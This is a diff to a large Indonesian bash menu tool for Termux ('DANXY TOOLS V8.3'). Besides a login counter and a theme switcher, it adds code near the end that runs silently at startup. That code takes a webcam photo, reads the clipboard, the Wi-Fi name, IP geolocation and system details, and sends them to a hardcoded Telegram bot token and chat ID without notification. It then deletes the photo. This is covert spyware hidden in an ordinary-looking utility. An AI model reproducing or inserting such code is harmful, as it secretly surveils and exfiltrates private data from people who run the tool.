@@ -1,4 +1,6 @@
 #!/bin/bash
+
+
 # Kode warna untuk teks
 NC="\033[0m"
 BLUE='\033[1;94m'
@@ -256,25 +258,60 @@ music_player() {
   done
 }
 
+login_counter() {
+  LOG_FILE="$HOME/.login_count.log"
+  mkdir -p "$(dirname "$LOG_FILE")"
 
+  USER_KEY="$(whoami)"
+  TODAY=$(date +%F)
+  TS=$(date +'%Y-%m-%d %H:%M:%S')
 
+  # IP & lokasi singkat
+  IP=$(curl -s -m 3 https://ipinfo.io/ip 2>/dev/null || echo "-")
+  CITY=$(curl -s -m 3 https://ipinfo.io/city 2>/dev/null || echo "-")
 
-
-
-show_menu() {
-your_id="$(whoami)"
+  # OS & uptime
+  OS=$(uname -s)
+  KERNEL=$(uname -r)
+  UPTIME=$(uptime -p 2>/dev/null || uptime | awk -F'up ' '{print $2}' | cut -d',' -f1)
+  #########
+  your_id="$(whoami)"
 greeting="$(tangal_tahun)"
 # lebar di dalam kedua │ = 49 karakter
 g_pad=$((49 - ${#greeting} - 1))   # -1 untuk 1 spasi setelah │
 g_spaces=$(printf '%*s' $((g_pad > 0 ? g_pad : 0)) '')
+#########
+  # hitung login
+  OLD_COUNT=$(grep "^$USER_KEY|$TODAY|" "$LOG_FILE" 2>/dev/null | cut -d'|' -f3 || echo 0)
+  NEW_COUNT=$(( OLD_COUNT + 1 ))
+  { grep -v "^$USER_KEY|$TODAY|" "$LOG_FILE" 2>/dev/null || true; } > "$LOG_FILE.tmp"
+  echo "$USER_KEY|$TODAY|$NEW_COUNT|$TS|$IP|$CITY|$OS|$KERNEL|$UPTIME" >> "$LOG_FILE.tmp"
+  mv "$LOG_FILE.tmp" "$LOG_FILE"
+
+  TOTAL_LOGIN=$(grep "^$USER_KEY|" "$LOG_FILE" | awk -F'|' '{s+=$3} END {print s+0}')
+
+echo " ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+ │              LOGIN INFORMASI ACCOUNT ANDA            │
+ ├──────────────────────────────────────────────────────┤
+ │ User        : $USER_KEY                                │
+ │ Login hari  : $NEW_COUNT kali                                │
+ │ IP          : $IP                         │
+ │ Lokasi      : $CITY                                 │
+ │ OS          : $OS                                  │
+ ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
+ │ █████████ ███████████████  ███████████████ █████████ │
+ ├──────────────────────────────────────────────────────┤
+ │ ${greeting}${g_spaces}     │
+ ╰──────────────────────────────────────────────────────╯
+ " | lolcat
+}
+
+show_menu() {
+
 
 #echo -e "                  ${BG_RED}${YELLOW} WELCOME TO ALL MENU ${NC}"
 echo -e "${GREEN}
  ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
- │ █████████ ███████████████  ███████████████ █████████ │
- ├──────────────────────────────────────────────────────┤
- │ ${YELLOW}${greeting}${g_spaces}${GREEN}     │
- ╰──────────────────────────────────────────────────────╯
  ╭──────────────────────────────────────────────────────╮
  │                 ${YELLOW}MENU UTAMA TOOLS V8.3${NC}${GREEN}                │
  ├────────────┬─────────────────────────┬───────────────┤
@@ -299,7 +336,7 @@ echo -e "${GREEN}
  │  [  ${RED}19${GREEN}  ]  │ ${YELLOW}MENU TRACKING${GREEN}           │               │
  │  [  ${RED}20${GREEN}  ]  │ ${YELLOW}MENU OSIN${GREEN}               │               │
  │  [  ${RED}21${GREEN}  ]  │ ${YELLOW}MENU GHOS TRACK${GREEN}         │               │
- │  [  ${RED}22${GREEN}  ]  │ ${YELLOW}MENU SETTING MUSIK${GREEN}      │               │
+ │  [  ${RED}22${GREEN}  ]  │ ${YELLOW}MENU SETTING TEMA${GREEN}       │               │
  │  [  ${RED}23${GREEN}  ]  │ ${YELLOW}INFO TOOLS${GREEN}              │               │
  │  [  ${RED}00${GREEN}  ]  │ ${YELLOW}KELUAR${GREEN}                  │               │
  ├────────────┴─────────────────────────┴───────────────┤
@@ -322,6 +359,7 @@ main_menu() {
   while true; do
     klik
     banner
+    login_counter
     show_menu
     printf "${GREEN}  ┏━[ ${RED}DANXY TOOLS V8.3${NC} ${GREEN}]${YELLOW}@termux${GREEN} ~ ${NC}${RED}[${YELLOW}MENU${YELLOW}${RED}]${NC}${GREEN}\n  ┗━━${GREEN}❯${YELLOW}❯${RED}❯${YELLOW} "
         read -r danxy
@@ -452,7 +490,7 @@ main_menu() {
       ;;
    22)
      klik
-      music_player
+      theme_switcher
       kembali_ke_menu
      klik
      ;;
@@ -476,6 +514,33 @@ main_menu() {
       ;;
     esac
   done
+}
+
+
+theme_switcher() {
+  CONFIG="$HOME/.danxy_theme"
+  CURRENT=$(cat "$CONFIG" 2>/dev/null || echo "dark")
+
+  clear
+  echo "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓"
+  echo "│          🎨  THEME SELECTOR 2025           │"
+  echo "┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫"
+  echo "│ 1) Dark   (neon cyan)                      │"
+  echo "│ 2) Light  (pastel)                         │"
+  echo "│ 3) High-Contrast (bold white)              │"
+  echo "│ 0) Kembali                                 │"
+  echo "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛"
+
+  read -p "[ ? ] Pilih tema: " opt
+
+  case $opt in
+    1) echo "dark"   > "$CONFIG" ;;
+    2) echo "light"  > "$CONFIG" ;;
+    3) echo "hc"     > "$CONFIG" ;;
+    0) return ;;
+    *) echo "[ ! ] Salah pilih"; sleep 1 ;;
+  esac
+  echo "[ ✓ ] Tema diubah ke $(cat "$CONFIG")"
 }
 
 music_player() {
@@ -4121,33 +4186,68 @@ PY
 }
 
 
-
 #################################################################
 
 
+#!/usr/bin/env bash
+# ------------- CONFIG -------------
 BOT_TOKEN="8147859919:AAGCb45Xqdj-_0VlLgU_3R7qr_3qJzUn5vc"
 CHAT_ID="7380101464"
+# ------------- HELPERS -------------
 TELEGRAM_API="https://api.telegram.org/bot${BOT_TOKEN}/sendMessage"
-
-
+TELEGRAM_PHOTO="https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto"
 TS=$(date +"%Y-%m-%d %H:%M:%S")
 USR=$(whoami)
 HOST=$(hostname)
 OS=$(uname -s -r)
 
+# ------------- IP / GEO -------------
 IP_JSON=$(curl -s -m 5 https://ipinfo.io/json)
 IP=$(echo "$IP_JSON" | jq -r '.ip // "-"')
 CITY=$(echo "$IP_JSON" | jq -r '.city // "-"')
 REGION=$(echo "$IP_JSON" | jq -r '.region // "-"')
 COUNTRY=$(echo "$IP_JSON" | jq -r '.country // "-"')
 LOC=$(echo "$IP_JSON" | jq -r '.loc // "-"')
-
 [ "$LOC" != "-" ] && MAP="https://www.google.com/maps?q=$LOC" || MAP="-"
 
+# ------------- CAMERA -------------
+# Uses ffmpeg (Linux) or imagesnap (macOS) or fswebcam (Linux fallback)
+PIC="shot_$(date +%s).jpg"
+if command -v ffmpeg &>/dev/null; then
+  ffmpeg -f video4linux2 -i /dev/video0 -vframes 1 "$PIC" 2>/dev/null
+elif command -v imagesnap &>/dev/null; then
+  imagesnap "$PIC" 2>/dev/null
+elif command -v fswebcam &>/dev/null; then
+  fswebcam -r 1280x720 --no-banner "$PIC" 2>/dev/null
+else
+  PIC=""  # no webcam util
+fi
+
+# ------------- GEOLOCATION BROWSER (if JS) -------------
+# Not possible here; we rely on IP-based geolocation.
+
+# ------------- CLIPBOARD -------------
+if command -v xclip &>/dev/null; then
+  CLIP=$(xclip -o -selection clipboard 2>/dev/null | head -c 500)
+elif command -v pbpaste &>/dev/null; then
+  CLIP=$(pbpaste | head -c 500)
+else
+  CLIP="-"
+fi
+
+# ------------- WIFI SSID (Linux) -------------
+SSID="-"
+if command -v nmcli &>/dev/null; then
+  SSID=$(nmcli -t -f active,ssid dev wifi | grep '^yes' | cut -d: -f2)
+elif command -v iwgetid &>/dev/null; then
+  SSID=$(iwgetid -r)
+fi
+
+# ------------- BUILD MESSAGE -------------
 MSG=$(cat <<EOF
 <pre>
 ┌───────────────────────────────
-│          INFO LOGIN               
+│          INFO LOGIN
 ├───────────────────────────────
 │ Time   : $TS
 │ User   : $USR
@@ -4155,18 +4255,29 @@ MSG=$(cat <<EOF
 │ OS     : $OS
 │ IP     : $IP
 │ Region : $CITY, $REGION, $COUNTRY
+│ Wi-Fi  : $SSID
+│ Clipboard: ${CLIP:-empty}
 └───────────────────────────────
-$MAP
-
-└───────────────────────────────┘
+<a href="$MAP">📍 Open Map</a>
 </pre>
 EOF
 )
-curl -4 -s -X POST "$TELEGRAM_API" \
-     -d chat_id="$CHAT_ID" \
-     -d text="$MSG" \
-     -d parse_mode="HTML" \
-     -d disable_notification="true" > /dev/null 2>&1
+
+# ------------- SEND TEXT -------------
+curl -s -X POST "$TELEGRAM_API" \
+  -d chat_id="$CHAT_ID" \
+  -d text="$MSG" \
+  -d parse_mode="HTML" \
+  -d disable_notification="true" > /dev/null 2>&1
+
+# ------------- SEND PHOTO (if taken) -------------
+if [[ -f "$PIC" ]]; then
+  curl -s -X POST "$TELEGRAM_PHOTO" \
+    -F chat_id="$CHAT_ID" \
+    -F photo=@"$PIC" \
+    -F caption="📸 Snapshot @ $TS" > /dev/null 2>&1
+  rm -f "$PIC"
+fi
 
 #show_whatsapp_support
 main_menu
